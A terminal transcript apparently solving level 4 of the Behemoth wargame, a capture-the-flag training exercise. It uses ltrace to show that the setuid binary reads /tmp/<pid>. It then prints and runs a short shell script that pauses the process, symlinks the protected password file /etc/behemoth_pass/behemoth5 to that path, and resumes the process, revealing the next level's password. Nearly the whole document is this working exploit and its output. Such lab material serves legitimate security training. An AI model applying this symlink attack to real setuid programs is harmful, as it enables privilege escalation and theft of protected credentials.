behemoth4@behemoth:/behemoth$ ltrace ./behemoth4
__libc_start_main(0x804857b, 1, 0xffffd784, 0x8048640 <unfinished ...>
getpid()                                                      = 11647
sprintf("/tmp/11647", "/tmp/%d", 11647)                       = 10
fopen("/tmp/11647", "r")                                      = 0
puts("PID not found!"PID not found!
)                                        = 15
+++ exited (status 0) +++

behemoth4@behemoth:/tmp/er$ vim exploit.sh
behemoth4@behemoth:/tmp/er$ chmod +x exploit.sh
behemoth4@behemoth:/tmp/er$ cat exploit.sh
    /behemoth/behemoth4&
    PID=$!
    kill -STOP $PID
    ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID
    kill -CONT $PID
    echo $PID
behemoth4@behemoth:/tmp/er$ ./exploit.sh
11878
behemoth4@behemoth:/tmp/er$ Finished sleeping, fgetcing
aizeeshing
